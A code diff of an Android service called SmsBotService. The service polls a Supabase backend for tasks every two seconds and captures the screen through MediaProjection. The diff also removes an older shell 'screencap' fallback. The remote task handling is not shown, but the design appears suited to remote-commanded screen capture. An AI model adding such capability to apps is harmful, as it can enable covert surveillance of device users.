@@ -21,11 +21,25 @@ public class SmsBotService extends Service {
     private static final String SUPABASE_URL = "https://xusnqiovgqgrxxyikvxk.supabase.co";
     private static final String SUPABASE_KEY = "sb_publishable_5Nr0YPv96-6cyQQKoDXlqg_OkhyqPvB";
     private boolean running = true;
+    private MediaProjection mediaProjection;
 
     @Override
     public void onCreate() {
         super.onCreate();
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
         startForeground(1, buildNotification());
+        if (intent != null && intent.hasExtra("resultCode") && intent.hasExtra("data")) {
+            int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
+            Intent data = intent.getParcelableExtra("data");
+            MediaProjectionManager manager =
+                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            if (manager != null) {
+                mediaProjection = manager.getMediaProjection(resultCode, data);
+            }
+        }
         new Thread(() -> {
             while (running) {
                 try {
@@ -36,6 +50,7 @@ public class SmsBotService extends Service {
                 try { Thread.sleep(2000); } catch (Exception e) {}
             }
         }).start();
+        return START_STICKY;
     }
 
     private void checkAndProcessTasks() throws Exception {
@@ -100,56 +115,67 @@ public class SmsBotService extends Service {
     }
 
     private byte[] takeScreenshot() {
-        if (MainActivity.mediaProjection != null) {
-            try {
-                DisplayMetrics metrics = new DisplayMetrics();
-                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-                wm.getDefaultDisplay().getRealMetrics(metrics);
-                int w = metrics.widthPixels, h = metrics.heightPixels;
-
-                ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
-                VirtualDisplay vd = MainActivity.mediaProjection.createVirtualDisplay("scr", w, h, metrics.densityDpi,
-                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
-                Thread.sleep(500);
-                Image image = reader.acquireLatestImage();
-                if (image != null) {
-                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                    Bitmap bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(buffer);
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                    image.close();
-                    vd.release();
-                    reader.close();
-                    return baos.toByteArray();
-                }
-                vd.release();
-                reader.close();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+        if (mediaProjection == null) {
+            Log.e("SMSBOT", "MediaProjection is null");
+            return null;
         }
-
+        ImageReader reader = null;
+        VirtualDisplay vd = null;
+        Image image = null;
         try {
-            File file = new File(getExternalFilesDir(null), "screen.png");
-            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
-                    "sh", "-c", "screencap -p " + file.getAbsolutePath()
-            });
-            process.waitFor();
-            if (!file.exists()) return null;
-
-            Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
-            file.delete();
-            if (bitmap == null) return null;
-
+            DisplayMetrics metrics = new DisplayMetrics();
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            wm.getDefaultDisplay().getRealMetrics(metrics);
+            int w = metrics.widthPixels;
+            int h = metrics.heightPixels;
+            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
+            vd = mediaProjection.createVirtualDisplay(
+                    "screen_capture",
+                    w,
+                    h,
+                    metrics.densityDpi,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    reader.getSurface(),
+                    null,
+                    null
+            );
+            Thread.sleep(800);
+            image = reader.acquireLatestImage();
+            if (image == null) {
+                Log.e("SMSBOT", "Image is null");
+                return null;
+            }
+            Image.Plane[] planes = image.getPlanes();
+            ByteBuffer buffer = planes[0].getBuffer();
+            int pixelStride = planes[0].getPixelStride();
+            int rowStride = planes[0].getRowStride();
+            int rowPadding = rowStride - pixelStride * w;
+            Bitmap bitmap = Bitmap.createBitmap(
+                    w + rowPadding / pixelStride,
+                    h,
+                    Bitmap.Config.ARGB_8888
+            );
+            bitmap.copyPixelsFromBuffer(buffer);
+            Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, w, h);
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+            cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos);
             bitmap.recycle();
+            cropped.recycle();
             return baos.toByteArray();
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e("SMSBOT", "Screenshot error", e);
+            return null;
+        } finally {
+            try {
+                if (image != null) image.close();
+            } catch (Exception ignored) {}
+            try {
+                if (vd != null) vd.release();
+            } catch (Exception ignored) {}
+            try {
+                if (reader != null) reader.close();
+            } catch (Exception ignored) {}
         }
-        return null;
     }
 
     private Notification buildNotification() {
